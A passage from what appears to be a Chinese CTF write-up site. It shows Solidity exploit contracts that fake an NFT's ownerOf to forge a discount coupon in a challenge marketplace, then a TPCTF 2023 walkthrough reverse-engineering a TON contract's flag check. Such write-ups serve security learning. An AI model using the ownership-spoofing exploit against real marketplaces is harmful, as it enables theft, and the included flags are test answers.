\u539f\u672c\u662f\u653b\u51fb\u5408\u7ea6\uff0c\u4e0d\u8fc7\u7b7e\u7f72\u8005\u53ea\u80fd\u662f\u7528\u6237\u8d26\u6237\uff0c\u6240\u4ee5\u9700\u8981\u4f2a\u9020\u4e00\u4e0b\uff0c\u7528\u4e00\u4e2a\u7528\u6237\u8d26\u6237\u7b7e\u7f72\u5f97\u5230\u7b7e\u540d\uff0c\u5e76\u5728 ownerOf \u7684\u65f6\u5019\u8fd4\u56de\u8fd9\u4e2a\u7b7e\u7f72\u8005\u5730\u5740\uff08\u8fd9\u6837 ownerOf \u65b9\u6cd5\u8fd8\u662f view \u7684\uff0c\u53ef\u4ee5 staticcall\uff09</p> \u6838\u5fc3\u4ee3\u7801 <p>ExploitNFT<pre><code>contract ExploitNFT is Context, ERC165 {\n    ...\n\n    address public fake_issuer;\n\n    function set_fake_issuer(address src) public {\n        fake_issuer = src;\n    }\n\n    function ownerOf(uint256 tokenId) public virtual  returns (address) {\n        if (fake_issuer != address(this)) {\n            address fake = fake_issuer;\n            return fake;\n        } else {\n            address owner = _owners[tokenId];\n            return owner;\n        }\n    }\n\n    ...\n}\n</code></pre> Exploit<pre><code>contract Exploit {\n    TctfMarket public market;\n    TctfNFT public myNFT;\n    ExploitNFT public expNFT;\n    address public issuer;\n\n    constructor(address chal, address issuer_) {\n        issuer = issuer_;\n        market = TctfMarket(chal);\n        myNFT = new TctfNFT();\n        expNFT = new ExploitNFT(\"ExploitNFT\", \"ENFT\", chal);\n    }\n\n    function airdrop() public {\n        market.tctfToken().airdrop();\n    }\n\n    function buyToken1() public returns (bool) {\n        market.tctfToken().approve(address(market), 1);\n        market.purchaseOrder(0);\n        return market.tctfNFT().ownerOf(1) == address(this);\n    }\n\n    function getTokenFromMarket() public {\n        myNFT.mint(address(this), 1);\n        myNFT.setApprovalForAll(address(market), true);\n        market.purchaseTest(address(myNFT), 1, 1337);\n    }\n\n    function buyToken2() public returns (bool) {\n        market.tctfToken().approve(address(market), 1337);\n        market.purchaseOrder(1);\n        return market.tctfNFT().ownerOf(2) == address(this);\n    }\n\n    function createNewOrder() public {\n        expNFT.mint(address(this), 1);\n        market.createOrder(address(expNFT), 1, 1);\n    }\n\n    function buyToken3(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        market.tctfToken().approve(address(market), 1);\n        expNFT.setApprovalForAll(address(market), true);\n        expNFT.set_fake_issuer(issuer);\n        require(market.getOrder(0).nftAddress == address(expNFT), \"not valid\");\n        require(market.getOrder(1).nftAddress == address(market.tctfNFT()), \"not valid\");\n        require(address(market.tctfNFT()) != address(expNFT), \"not valid\");\n        market.purchaseWithCoupon(SignedCoupon(\n            Coupon(\n                1, // orderId\n                1, // newprice\n                issuer, // issuer\n                address(this), // user\n                bytes(\"exploit\")\n            ),\n            Signature(\n                v, rs\n            )\n        ));\n        return market.tctfNFT().ownerOf(3) == address(this);\n    }\n\n    function getSerialized() public returns (bytes32) {\n        Coupon memory coupon;\n        Order memory order;\n        order.nftAddress = address(expNFT);\n        order.tokenId = 1;\n        order.price = 1;\n        coupon.user = address(this);\n        coupon.issuer = issuer;\n        coupon.newprice = 1;\n        coupon.reason = bytes(\"exploit\");\n        bytes memory serialized = abi.encode(\n            \"I, the issuer\", coupon.issuer,\n            \"offer a special discount for\", coupon.user,\n            \"to buy\", order, \"at\", coupon.newprice,\n            \"because\", coupon.reason\n        );\n        return keccak256(serialized);\n    }\n\n    function check(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        return ecrecover(getSerialized(), v, rs[0], rs[1]) == issuer;\n    }\n\n    function exp1() public returns (bool) {\n        airdrop();\n        createNewOrder();\n        getTokenFromMarket();\n        if (!buyToken1()) return false;\n        if (!buyToken2()) return false;\n        return true;\n    }\n\n    function exp2(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        if (!buyToken3(v, rs)) return false;\n        market.win();\n        return true;\n    }\n\n    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n</code></pre> \u518d\u914d\u5408 web3.py \u8fdb\u884c\u4ea4\u4e92\u5373\u53ef\uff08\u7b7e\u7f72\u4e5f\u5728\u8fd9\u91cc\u5b8c\u6210\uff09</p> <p>flag: flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}</p>"},{"location":"writeups/tpctf2023/","title":"TPCTF 2023 Writeup","text":"<p> \u7ea6 2147 \u4e2a\u5b57  398 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u6e05\u5317\u5408\u529e\u7684 XCTF \u5206\u7ad9\u8d5b\uff0c\u9898\u4e0d\u5c11\uff0c\u8d28\u91cf\u5f88\u9ad8\uff0c\u961f\u53cb\u5e26\u98de\u4e86</p> <p></p> <p>\u7b2c\u4e00\u5929\u4e00\u76f4\u5728\u505a\u533a\u5757\u94fe\u9898\u6ca1\u770b\u522b\u7684\uff0c\u7b2c\u4e8c\u5929\u505a\u4e86\u4fe9 misc</p>"},{"location":"writeups/tpctf2023/#tonyscontract","title":"TonysContract","text":"<p>\u4e00\u4e2a\u6ca1\u63a5\u89e6\u8fc7\u7684\u533a\u5757\u94fe\uff0c\u53eb TONcoin\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u516c\u7f51\u4e0a\u7684\u5408\u7ea6 https://testnet.ton.cx/address/EQAM2HjRB-PFaD2mlJ5QjQAlfRAcmZ-j9ydT_54FzmbffN6E\uff0c\u6362\u4e00\u4e2a\u533a\u5757\u6d4f\u89c8\u5668\u662f https://testnet.tonscan.org/address/EQAM2HjRB-PFaD2mlJ5QjQAlfRAcmZ-j9ydT_54FzmbffN6E\u3002\u56e0\u4e3a\u662f\u516c\u7f51\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u4e0d\u662f\u9700\u8981\u53d1\u4ea4\u6613\u7684\uff0c\u6709\u5408\u7ea6\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u5148\u8003\u8651\u9006\u5411\u5408\u7ea6\u3002</p> \u9898\u76ee\u5408\u7ea6\u53cd\u6c47\u7f16 <pre><code>SETCP0\n(:methods\nrecv_internal: \n    2 2 BLKDROP2\n    c4 PUSH\n    CTOS\n    8 LDU\n    s1 POP\n    32 LDU\n    s0 s2 XCHG\n    32 PUSHINT\n    SDSKIPFIRST\n    NOW\n    ROT\n    LESS\n    6 THROWIF\n    s0 PUSH\n    SBITS\n    344 PUSHINT\n    EQUAL\n    6 THROWIFNOT\n    PUSHNULL\n    s2 PUSH\n    SEMPTY\n    NOT\n    &lt;{\n    s0 POP\n    s0 s1 XCHG\n    LDDICT\n    ROTREV\n    }&gt; PUSHCONT\n    IF\n    s0 s3 XCHG\n    CTOS\n    4 PUSHINT\n    SDSKIPFIRST\n    LDMSGADDR\n    s0 POP\n    s0 s1 XCHG\n    48 LDU\n    s0 s1 XCHG\n    92703703713403 PUSHINT\n    EQUAL\n    6 THROWIFNOT\n    NIL\n    11000385076366155543686602566826962197403024283852028545596640486225 PUSHINT\n    SETRAND\n    36 PUSHINT\n    PUSHREFCONT\n    REPEAT\n    s4 POP\n    8 LDU\n    s0 POP\n    125 EQINT\n    6 THROWIFNOT\n    35 PUSHINT\n    s0 PUSH\n    PUSHREFCONT\n    REPEAT\n    s0 POP\n    0 PUSHINT\n    36 PUSHINT\n    PUSHREFCONT\n    REPEAT\n    s1 s3 XCHG\n    s0 s1 XCHG\n    8 LDU\n    233 PUSHINT\n    ROT\n    MUL\n    8 PUSHPOW2\n    RAND\n    ADD\n    8 PUSHPOW2DEC\n    AND\n    8 PUSHPOW2\n    RAND\n    XOR\n    s5 PUSH\n    -8 PUSHINT\n    DICTUGET\n    NULLSWAPIFNOT\n    s0 POP\n    8 LDU\n    s0 POP\n    s1 s2 XCHG\n    TPUSH\n\nrecv_external: \n    s0 POP\n    c4 PUSH\n    CTOS\n    8 LDU\n    s0 s1 XCHG\n    0 EQINT\n    6 THROWIFNOT\n    ACCEPT\n    32 LDU\n    PUSHNULL\n    s1 PUSH\n    SEMPTY\n    NOT\n    &lt;{\n    s0 POP\n    LDDICT\n    s0 s1 XCHG\n    }&gt; PUSHCONT\n    IF\n    s0 s1 XCHG\n    288 PUSHINT\n    LDSLICEX\n    s0 POP\n    1 PUSHINT\n    NEWC\n    8 STU\n    s1 s3 XCHG\n    32 STU\n    STDICT\n    s0 s1 XCHG\n    STSLICER\n    ENDC\n    c4 POP\n) 19 DICTPUSHCONST\nDICTIGETJMPZ\n11 THROWARG\n</code></pre> <p>\u9996\u5148\u7b80\u5355\u5b66\u4e00\u4e0b\u8fd9\u4e2a\u94fe\uff0c\u4e00\u4e9b\u6750\u6599\uff1a</p> <ul> <li>\u4e00\u7bc7 TON \u5408\u7ea6\u5f00\u53d1\u5165\u95e8\u7684\u6587\u7ae0</li> <li>https://github.com/ton-blockchain</li> <li>https://github.com/ton-community</li> <li>https://docs.ton.org/develop/overview</li> <li>\u5b98\u65b9\u6587\u6863\u5165\u95e8\u6559\u7a0b https://docs.ton.org/develop/howto/step-by-step</li> </ul> <p>\u5f97\u5230\u4e86\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>TON \u4e2d\u7684\u8d26\u6237\u4e0d\u533a\u5206 ETH \u4e00\u6837\u7684 EOA \u548c\u5408\u7ea6\u8d26\u6237\uff0c\u4e00\u5207\u7686\u5408\u7ea6</li> <li>\u5408\u7ea6\u5730\u5740\u662f 32 \u5b57\u8282\u6570\uff0c\u540c\u65f6\u6709\u5305\u88c5\u4e86\u6821\u9a8c\u4fe1\u606f\u7b49\u518d base64 \u7684 user-friendly \u5730\u5740\u5199\u6cd5<ul> <li>https://docs.ton.org/learn/overviews/addresses</li> </ul> </li> <li>\u5408\u7ea6\u91c7\u7528 FunC\uff08\u9ad8\u7ea7\uff09\u6216 Fift\uff08\u4f4e\u7ea7\uff09\u8bed\u8a00\u7f16\u5199\uff0c\u7f16\u8bd1\u5230 TVM \u5b57\u8282\u7801</li> <li>\u5408\u7ea6\u90e8\u7f72\u7684\u65f6\u5019\u6709 code \u548c data \u4e24\u4e2a\u90e8\u5206<ul> <li>\u90fd\u662f\u5b58\u5728\u94fe\u4e0a\u7684\uff0ccode \u90e8\u5206\u662f\u5408\u7ea6\u7684\u5b57\u8282\u7801\uff0cdata \u90e8\u5206\u662f\u5408\u7ea6\u7684\u6570\u636e\uff08\u53ef\u4fee\u6539\uff09</li> <li>\u90e8\u7f72\u65b9\u5f0f\u5e94\u8be5\u7c7b\u4f3c ETH \u662f\u901a\u8fc7\u6267\u884c deploy bytecode \u6765\u540c\u65f6\u90e8\u7f72 code \u548c data\uff08\u6ca1\u7ec6\u770b\uff09</li> </ul> </li> <li>code\u3001data\u3001message \u7b49\u7684\u8868\u793a\u65b9\u5f0f\u90fd\u662f\u4f7f\u7528 bag of cells (boc) \u6765\u7f16\u7801\u7684<ul> <li>https://docs.ton.org/develop/data-formats/cell-boc</li> <li>cell \u662f TON \u4e2d\u7684\u4e00\u4e2a\u57fa\u672c\u7ed3\u6784\uff0c\u53ef\u4ee5\u5b58\u50a8 1023 \u4e2a bit\uff0c\u5e76\u4e14\u5e26\u6709\u6700\u591a\u56db\u4e2a\u6307\u5411\u5176\u4ed6 cells \u7684 reference</li> <li>cell \u7684\u7f16\u7801\u6709\u70b9\u590d\u6742\uff0c\u53ef\u4ee5\u770b\u94fe\u63a5\u91cc\u7684\u793a\u4f8b</li> <li>cell \u9010\u4e2a\u94fe\u63a5\u5f62\u6210\u7684\u6574\u4f53\u5c31\u662f bag of cells\uff0c\u7f16\u7801\u5c31\u662f\u5c06\u6240\u6709 cell \u6253\u5305</li> <li>\u533a\u5757\u6d4f\u89c8\u5668\u89e3\u6790\u51fa\u6765\u7684 cells \u7ed3\u6784\u5c31\u662f boc \u7684\u6811\u5f62\u7ed3\u6784<ul> <li>\u7f29\u8fdb\u4ee3\u8868 ref \u7684\u5b50\u8282\u70b9\uff0cx{} \u4e2d\u7684\u5185\u5bb9\u5c31\u662f cell \u7684\u5185\u5bb9</li> <li>x{} \u4e2d\u5e26\u6709\u7684\u4e0b\u5212\u7ebf\u8868\u793a\u5c06\u6700\u540e\u4e00\u4e2a 1 \u4ee5\u53ca\u540e\u9762\u6240\u6709\u7684 0 \u5220\u6389\uff08\u4ee5\u6b64\u8868\u793a\u975e 8 \u7684\u500d\u6570\u7684 bit\uff09</li> </ul> </li> <li>message \u7b49\u7684\u89c4\u8303\u6587\u6863\u91cc\u901a\u8fc7\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u53eb TL-B \u7684\u8bed\u8a00\u6765\u89c4\u5b9a\uff08\u770b\u8d77\u6765\u597d\u590d\u6742\u597d\u8822\uff09<ul> <li>https://docs.ton.org/develop/data-formats/msg-tlb</li> </ul> </li> </ul> </li> <li>TVM \u662f\u4e00\u4e2a\u6808\u5f0f\u865a\u62df\u673a\uff0c\u6307\u4ee4\u5f88\u591a\uff08\u7c7b\u4f3c CISC\uff09\uff0c\u6709\u4e00\u4e2a\u4e34\u65f6\u7684\u6808\u548c\u4e00\u4e9b\u5bc4\u5b58\u5668<ul> <li>https://docs.ton.org/learn/tvm-instructions/tvm-overview</li> <li>\u6808\u4e0a\u5143\u7d20\u53ef\u4ee5\u6709\u7c7b\u578b\uff1a<ul> <li>257bit \u6574\u578b\u3001\u5143\u7ec4\u3001Null</li> <li>cell\u3001slice\uff08\u53ef\u8bfb\u7684 cell\uff09\u3001builder\uff08\u53ef\u5199\u7684 cell\uff09\u3001continuation\uff08\u4e00\u7ec4\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff09</li> </ul> </li> <li>\u6808\u7684\u521d\u59cb\u5316\u4f9d\u6b21 push balance value raw_message message_body funcion_selector\uff08internal \u8c03\u7528\u7684\u60c5\u51b5\uff09<ul> <li>https://docs.ton.org/learn/tvm-instructions/tvm-initialization#internal-message</li> </ul> </li> <li>\u5bc4\u5b58\u5668 s0 \u5c31\u8868\u793a\u6808\u9876\u5143\u7d20\uff0cs1 \u8868\u793a\u6808\u9876\u7b2c\u4e8c\u4e2a\u5143\u7d20\uff0c\u4ee5\u6b64\u7c7b\u63a8<ul> <li>\u5176\u5b9e\u5c31\u662f\u522b\u540d\uff0c\u4e0d\u662f\u72ec\u7acb\u4e8e\u6808\u4e4b\u5916\u7684\u5bc4\u5b58\u5668</li> </ul> </li> <li>\u6709 c0-c7 \u516b\u4e2a\u63a7\u5236\u5bc4\u5b58\u5668\uff1a<ul> <li>\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u6709 c4 \u521d\u59cb\u8868\u793a\u5408\u7ea6\u7684 data \u90e8\u5206\uff0cc7 \u521d\u59cb\u8868\u793a\u4e00\u4e9b\u4e34\u65f6\u6570\u636e</li> <li>https://docs.ton.org/learn/tvm-instructions/tvm-overview#control-registers</li> </ul> </li> <li>\u9ed8\u8ba4\u6709\u4e24\u4e2a\u51fd\u6570\uff0c\u94fe\u4e0a\u5408\u7ea6\u4e4b\u95f4\u8c03\u7528\u4f1a\u89e6\u53d1 recv_internal\uff0c\u4ece\u5916\u90e8\u8c03\u7528\u4f1a\u89e6\u53d1 recv_external</li> <li>\u8c03\u7528\u7684\u65f6\u5019\u5148\u521d\u59cb\u5316\u6808\u548c\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u6267\u884c\u5b57\u8282\u7801<ul> <li>\u5b57\u8282\u7801\u5f00\u5934\u4e00\u822c\u4f1a\u8bfb\u53d6 function_selector \u5224\u65ad\u8c03\u7528\u7684\u51fd\u6570\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\uff080 \u8868\u793a internal\uff0c-1 \u8868\u793a external\uff09</li> <li>\u8fd9\u65f6\u5019\u53ef\u4ee5\u4ece\u6808\u4e0a\u8bfb\u53d6 message \u5185\u5bb9\uff0c\u4ece c4 \u4e2d\u8bfb\u53d6 data \u90e8\u5206\u5185\u5bb9</li> </ul> </li> <li>\u5177\u4f53\u7684\u6307\u4ee4\u53ef\u4ee5\u770b\u6587\u6863\uff0c\u6216\u8005\u6587\u6863\u6e90\u7801 GitHub \u91cc\u7684 csv \u8868\u683c<ul> <li>https://docs.ton.org/learn/tvm-instructions/instructions</li> </ul> </li> </ul> </li> </ul> <p>\u63a5\u4e0b\u6765\u662f\u9898\u76ee\uff0c\u5bf9\u7740\u5b57\u8282\u7801\u6a21\u62df\u6808\u9006\u4e86 external \u53d1\u73b0\u5176\u5b9e\u4ec0\u4e48\u90fd\u6ca1\u5e72\uff0c\u6240\u4ee5\u5176\u5b9e\u4e3b\u8981\u903b\u8f91\u90fd\u5728 internal \u4e2d\u3002\u5b57\u8282\u7801\u91cc\u51fa\u73b0\u4e86 LDDICT \u6307\u4ee4\uff0c\u5373\u4ece\u6808\u9876\u7684 cell \u4e2d\u63d0\u53d6\u51fa\u4e00\u4e2a dict\uff0c\u4f46 dict \u662f\u4ec0\u4e48\u3001\u600e\u4e48\u89e3\u6790\u90fd\u4e0d\u592a\u6e05\u695a\uff0c\u6240\u4ee5\u5e72\u8106\u627e\u52a8\u8c03\u7684\u624b\u6bb5\u4e86\u3002</p> <p>\u53ef\u4ee5\u641c\u5230  ton-community/ton-contract-executor\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u4e0d\u9700\u8981 TON \u7f51\u7edc\u5c31\u6267\u884c\u4e00\u4e2a\u5408\u7ea6\uff0c\u9700\u8981 yarn \u88c5\u4e00\u4e0b\u4f9d\u8d56\uff0c\u7136\u540e\u7f16\u5199\u4e00\u4e2a main.mjs:</p> <pre><code>import { SmartContract, internal, externalIn } from \"ton-contract-executor\";\nimport { Cell, BitString } from \"@ton/core\";\n\nasync function main() {\n    let contract = await SmartContract.fromCell(\n        Cell.fromBoc(Buffer.from(\"...\", \"hex\"))[0],\n        Cell.fromBoc(Buffer.from(\"...\", \"base64\"))[0],\n        {debug: true}\n    );\n    const msgBody = new Cell();\n    console.log(msgBody);\n    const res = await contract.sendInternalMessage(\n        internal({\n            dest: contract.address,\n            value: 0n,\n            bounce: false,\n            body: msgBody,\n        })\n    )\n    console.log(res);\n    console.log(res.logs);\n}\n\nawait main();\n</code></pre> <p>\u8fd9\u6837\u7ed9\u5408\u7ea6\u5f00\u542f debug \u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u6bcf\u6b21\u6267\u884c\u6307\u4ee4\u7684\u4fe1\u606f\uff0c\u4ee5\u6b64\u53ef\u4ee5\u89e3\u51b3\u4e0d\u77e5\u9053\u6302\u5728\u54ea\u91cc\u4ee5\u53ca PUSHREFCONT \u5728\u7f51\u7ad9\u4e0a\u6ca1\u6709\u5177\u4f53\u53cd\u6c47\u7f16\u7684\u95ee\u9898\u3002</p> <p>\u63a5\u4e0b\u6765\u77e5\u9053\u4e86\u8fd0\u884c\u65f6\u6302\u5728\u4e86\u5f00\u5934\uff0c\u56e0\u4e3a\u5f00\u5934\u8bfb\u53d6\u7684 data[1:5] \u4f5c\u4e3a timestamp \u548c\u5f53\u524d\u7684\u65f6\u95f4\u6bd4\u8f83\uff0c\u5982\u679c\u5728 data \u8bbe\u5b9a\u7684\u4ee5\u524d\u5c31 throw 6 \u5f02\u5e38\uff0c\u6240\u4ee5\u5e72\u8106\u5728\u4ee3\u7801\u91cc\u628a LESS(B9) \u6539\u4e3a GEQ(BE) \u5c31\u53ef\u4ee5\u4e86\u3002\u63a5\u4e0b\u6765\u540e\u9762\u7684\u90e8\u5206\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u4e86\uff0c\u6839\u636e\u6bcf\u6761\u6307\u4ee4\u6765\u6a21\u62df\u6808\uff0c\u5f97\u5230\u4ee5\u4e0b\u7684\u6808\u53d8\u5316\u5206\u6790\uff1a</p> internal \u6808\u53d8\u5316\u5206\u6790 <pre><code>msg_raw message data\nmsg_raw message data[8:]\nmsg_raw message data[8:40] data[40:]\nmsg_raw data[40:] data[8:40] message\nmsg_raw data[40:] data[8:40] message 32\nmsg_raw data[40:] data[8:40] message[32:] now\nmsg_raw data[40:] message[32:] now data[8:40]\nmsg_raw data[40:] message[32:] -1\nmsg_raw data[40:] message[32:]\nmsg_raw data[40:] message[32:] message[32:]\nmsg_raw data[40:] message[32:] 344\nmsg_raw data[40:] message[32:] 344 344\nmsg_raw data[40:] message[32:] 0\nmsg_raw data[40:] message[32:] null\nmsg_raw data[40:] message[32:] null 1\nmsg_raw data[40:] message[32:] null 1 cont1\n    msg_raw data[40:] message[:32] null\n    msg_raw data[40:] message[:32]\n    msg_raw message[32:] data[40:]\n    msg_raw message[32:] D data[40+dict:]\n    msg_raw data[40+dict:] message[32:] D\nD data[40+dict:] message[32:] msg_raw\nD data[40+dict:] message[32:] msg_raw 4\nD data[40+dict:] message[32:] msg_raw[4:]\nD data[40+dict:] message[32:] msg_raw.src msg_raw[src:]\nD data[40+dict:] message[32:] msg_raw.src\nD data[40+dict:] msg_raw.src message[32:]\nD data[40+dict:] msg_raw.src message[32:32+48] message[32+48:]\nD data[40+dict:] msg_raw.src message[32+48:] message[32:32+48]\nD data[40+dict:] msg_raw.src message[32+48:] message[32:32+48] 92703703713403\nD data[40+dict:] msg_raw.src message[32+48:]\nD data[40+dict:] msg_raw.src message[32+48:] ()\nD data[40+dict:] msg_raw.src message[32+48:] () 11000385076366155543686602566826962197403024283852028545596640486225\nD data[40+dict:] msg_raw.src message[32+48:] ()\nD data[40+dict:] msg_raw.src message[32+48:] () 36\nD data[40+dict:] msg_raw.src message[32+48:] () 36 refcont\n    D data[40+dict:] msg_raw.src message[32+48:] ()\n    D data[40+dict:] msg_raw.src () message[32+48:]\n    D data[40+dict:] msg_raw.src () message[32+48:32+56] message[32+56:]\n    D data[40+dict:] msg_raw.src () message[32+48:32+56] message[32+56:] 233\n    D data[40+dict:] msg_raw.src () message[32+56:] 233 message[32+48:32+56]\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56] 256\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56] rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]+rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]+rand(256) 255\n    D data[40+dict:] msg_raw.src () message[32+56:] (233*message[32+48:32+56]+rand(256))&amp;(255)\n    D data[40+dict:] msg_raw.src () message[32+56:] (233*message[32+48:32+56]+rand(256))&amp;(255) rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256) D\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256) D 8\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)] ?\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][8:]\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8]\n    D data[40+dict:] msg_raw.src message[32+56:] () D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8]\n    D data[40+dict:] msg_raw.src message[32+56:] (D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8])\n... exec refcont for 36 times ...\n\nD data[40+dict:] msg_raw.src message[...:] flag_content\nflag_content data[40+dict:] msg_raw.src message[...:]\n...\nflag_content data[40+dict:] msg_raw.src 35\nflag_content data[40+dict:] msg_raw.src 35 35\nflag_content data[40+dict:] msg_raw.src 35 35 refcont\n    flag_content data[40+dict:] msg_raw.src 35\n    flag_content data[40+dict:] msg_raw.src 35 35\n    flag_content data[40+dict:] msg_raw.src 35 36\n    flag_content data[40+dict:] msg_raw.src 35 rand(36)\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content 35\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35]\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35] (flag_content) rand(36)\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35] flag_content[rand(36)]\n    flag_content[35] data[40+dict:] msg_raw.src 35 rand(36) flag_content flag_content[rand(36)] 35\n    flag_content[35] data[40+dict:] msg_raw.src 35 rand(36) flag_content{35=flag_content[rand(36)]}\n    35 data[40+dict:] msg_raw.src flag_content{35=flag_content[rand(36)]} flag_content[35] rand(36)\n    35 data[40+dict:] msg_raw.src flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]}\n    flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]} data[40+dict:] msg_raw.src 35\n    flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]} data[40+dict:] msg_raw.src 34\n\n    flag_content_modified data[40+dict:] msg_raw.src 34\n    flag_content_modified data[40+dict:] msg_raw.src 34 34\n    flag_content_modified data[40+dict:] msg_raw.src 34 35\n    flag_content_modified data[40+dict:] msg_raw.src 34 rand(35)\n    flag_content_modified data[40+dict:] msg_raw.src 34 rand(35) flag_content_modified 34\n    ...\n\n    flag_content_modified data[40+dict:] msg_raw.src 0\nflag_content_modified data[40+dict:] msg_raw.src\nflag_content_modified data[40+dict:] msg_raw.src 0\nflag_content_modified data[40+dict:] msg_raw.src 0 36\nflag_content_modified data[40+dict:] msg_raw.src 0 36 refcont\n    flag_content_modified data[40+dict:] msg_raw.src 0\n    flag_content_modified data[40+dict:] msg_raw.src 0 flag_content_modified 0\n    flag_content_modified data[40+dict:] msg_raw.src 0 flag_content_modified[0]\n    flag_content_modified flag_content_modified[0] msg_raw.src 0 data[40+dict:]\n    flag_content_modified flag_content_modified[0] msg_raw.src 0 data[40+dict:48+dict] data[48+dict:]\n    flag_content_modified data[48+dict:] msg_raw.src 0 flag_content_modified[0] data[40+dict:48+dict]\n    flag_content_modified[0]==data[40+dict:48+dict]?\n</code></pre> <p>\u8fd9\u6837\u770b\u6574\u4f53\u7684\u903b\u8f91\u5c31\u662f\uff1a</p> <pre><code>input = input[4:]\nif input[:6] != \"TPCTF{\":\n    throw 6\nflag = []\nsetrand(11000385076366155543686602566826962197403024283852028545596640486225)\nfor i in range(36):\n    flag.append(D[((233*input[i]+rand(256))&amp;255)^rand(256)][0])\nfor i in range(35, 0, -1):\n    a = rand(i + 1)\n    flag[i], flag[a] = flag[a], flag[i]\nfor i in range(36):\n    if flag[i] != data_after_dict[i]:\n        throw 666\n</code></pre> <p>\u4e3a\u4e86\u62ff\u5230\u5176\u4e2d\u7684\u6570\u636e\u9700\u8981\u8ba9 executor \u5728\u8fd0\u884c\u4e2d\u8f93\u51fa\u6808\u7684\u5185\u5bb9\uff0c\u901a\u8fc7\u9605\u8bfb\u4ee3\u7801\u77e5\u9053 ton-contract-executor \u6700\u7ec8\u8c03\u7528\u4e86 ton \u5b98\u65b9 vm-exec \u5206\u652f\u91cc\u7f16\u8bd1\u597d\u7684 wasm \u6765\u8dd1\u6307\u4ee4\uff0c\u540c\u65f6\u4e5f\u7ed9\u4e86 builder  ton-community/ton-vm-exec-builder\uff08\u8fd9\u4e2a builder \u7684 README \u6709\u95ee\u9898\uff0cclone ton \u6e90\u7801\u7684\u65f6\u5019\u9700\u8981\u52a0 --recursive\uff09\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5 patch ton \u7684\u6e90\u7801\u91cd\u65b0\u7f16\u8bd1\u751f\u6210 wasm \u8f7d\u5165 executor \u4e86\u3002\u5728 ton-blockchain/crypto/vm/vm.cpp \u4e2d VmState::step() \u5f00\u5934\u7684\u5730\u65b9\u52a0\u5165\u6808\u7684\u8f93\u51fa\u4ee3\u7801\uff1a</p> <pre><code>std::ostringstream os;\nstack-&gt;dump(os, 3);\nVM_LOG(this) &lt;&lt; \"stack:\" &lt;&lt; std::move(os).str();\n</code></pre> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u62ff\u5230\u5176\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u503c\u4e86\uff0c\u4e0d\u8fc7\u6700\u540e\u7684\u5224\u65ad\u53ea\u8981\u6709\u4e0d\u4e00\u6837\u7684\u5c31\u4f1a\u629b\u51fa 666 \u7ed3\u675f\u6267\u884c\u800c\u4e0d\u663e\u793a\u540e\u9762\u7684 data_after_dict \u503c\uff0c\u6240\u4ee5\u4e3a\u4e86 dump \u51fa\u8fd9\u90e8\u5206\u8fd8\u9700\u8981 patch \u4e00\u4e0b contops.cpp \u91cc exec_throw_fixed\uff0c\u4f7f\u5f97 excno \u4e3a 666 \u65f6 return 0\u3002\u4e4b\u540e\u5f97\u5230\u6240\u6709\u6808\u8f93\u51fa\uff0c\u6839\u636e\u6b63\u5219 <code>(\\d+?) (\\d+?) CS</code> \u53ef\u4ee5\u7b5b\u9009\u5f97\u5230 data_after_dict \u7684\u5185\u5bb9\uff0c\u6839\u636e\u6b63\u5219 <code>execute RAND.*?(\\d+?) (\\d+?) \\]</code> \u53ef\u4ee5\u7b5b\u9009\u5f97\u5230\u6bcf\u6b21\u4ea4\u6362\u7684 i \u548c 